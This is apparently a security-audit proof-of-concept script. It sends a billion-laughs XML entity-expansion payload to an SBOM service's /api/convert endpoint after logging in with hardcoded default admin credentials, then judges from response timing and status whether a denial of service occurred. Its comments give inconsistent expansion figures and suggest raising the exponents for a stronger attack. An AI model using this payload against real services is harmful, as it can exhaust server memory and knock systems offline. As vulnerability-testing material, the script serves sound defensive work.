"""
PoC for SEC-002 (TLT-2) — DO NOT RUN against production.
============================================================
Tests whether POST /api/convert (CycloneDX XML → JSON) is vulnerable
to billion-laughs XML entity expansion.

Python's stdlib xml.etree.ElementTree handles internal entities — if
the converter doesn't use defusedxml, a small XML payload can blow
memory.

Sends a 1000x1000x10 entity expansion (target: 10^7 expansions).
Watches for:
  - 500 / 504 from server
  - Large response time (>10s = DoS confirmed)
  - Memory error in backend log
"""
from __future__ import annotations

import json
import os
import sys
import time
import urllib.error
import urllib.request

API     = os.environ.get("POC_API_URL",        "http://localhost:9100")
ADMIN_U = os.environ.get("POC_ADMIN_USERNAME", "admin")
ADMIN_P = os.environ.get("POC_ADMIN_PASSWORD", "sbom@2024")

# Modest billion-laughs: 10*10*10 = 1000 substitutions of "lol"
# (3 KB output if expanded). Increase exponents for stronger DoS.
PAYLOAD = b"""<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<bom xmlns="http://cyclonedx.org/schema/bom/1.5" version="1">
  <components>
    <component type="library">
      <name>&lol4;</name>
      <version>1.0.0</version>
    </component>
  </components>
</bom>
"""


def main():
    print("PoC SEC-002 - billion-laughs in /api/convert (XML→JSON)\n")

    # admin login
    req = urllib.request.Request(
        f"{API}/api/auth/login",
        data=json.dumps({"username": ADMIN_U, "password": ADMIN_P}).encode(),
        headers={"Content-Type": "application/json"}, method="POST",
    )
    with urllib.request.urlopen(req) as r:
        admin_tok = json.loads(r.read())["access_token"]
    print("[1] admin login OK")

    # POST /api/convert?target=cyclonedx-json with billion-laughs XML
    # Endpoint expects multipart/form-data with a "file" field.
    boundary = "----PocBoundaryBL"
    body = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="file"; filename="evil.xml"\r\n'
        "Content-Type: application/xml\r\n\r\n"
    ).encode() + PAYLOAD + f"\r\n--{boundary}--\r\n".encode()

    req = urllib.request.Request(
        f"{API}/api/convert?target=spdx-json",     # XML→SPDX so conversion actually runs
        data=body, method="POST",
        headers={
            "Authorization": f"Bearer {admin_tok}",
            "Content-Type": f"multipart/form-data; boundary={boundary}",
        },
    )
    print(f"[2] sending {len(PAYLOAD)} bytes of billion-laughs payload")
    print(f"    expansion factor: 10^4 = 10000 'lol' substitutions if naively expanded")

    t0 = time.time()
    code = None
    body_excerpt = ""
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            code = r.status
            data = r.read()
            elapsed = time.time() - t0
            body_excerpt = data[:200].decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        elapsed = time.time() - t0
        code = e.code
        body_excerpt = e.read().decode("utf-8", errors="replace")[:300]
    except urllib.error.URLError as e:
        elapsed = time.time() - t0
        code = -1
        body_excerpt = f"URLError: {e}"
    except Exception as e:
        elapsed = time.time() - t0
        code = -2
        body_excerpt = f"{type(e).__name__}: {e}"

    print(f"[3] response: HTTP {code} in {elapsed:.2f}s")
    print(f"    body excerpt: {body_excerpt[:200]}")
    print()

    # Verdict logic:
    if elapsed > 10:
        print("=" * 70)
        print(f"[DoS-LIKELY] response took {elapsed:.1f}s — server CPU or memory pressure")
        print("=" * 70)
        return 1
    if code == 500 and "ParseError" not in body_excerpt and "ValidationError" not in body_excerpt:
        print("=" * 70)
        print("[POSSIBLE EXPANSION] 500 with no parse-error message — entity expansion may have triggered exception")
        print("=" * 70)
        return 1
    if code == 200:
        # Check whether the response contains expanded "lol" string
        if "lol" * 100 in body_excerpt:
            print("=" * 70)
            print(f"[EXPANSION CONFIRMED] response contains expanded entities — XML bomb succeeded")
            print("=" * 70)
            return 1
        print("[NO LEAK] 200 returned without entity expansion")
        return 0
    if code == 400 and ("XML" in body_excerpt or "entity" in body_excerpt.lower() or "DOCTYPE" in body_excerpt):
        print("[SAFE] 400 — parser rejected DOCTYPE / entities (defusedxml-equivalent behaviour)")
        return 0
    print(f"[UNCLEAR] code={code}, body={body_excerpt}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
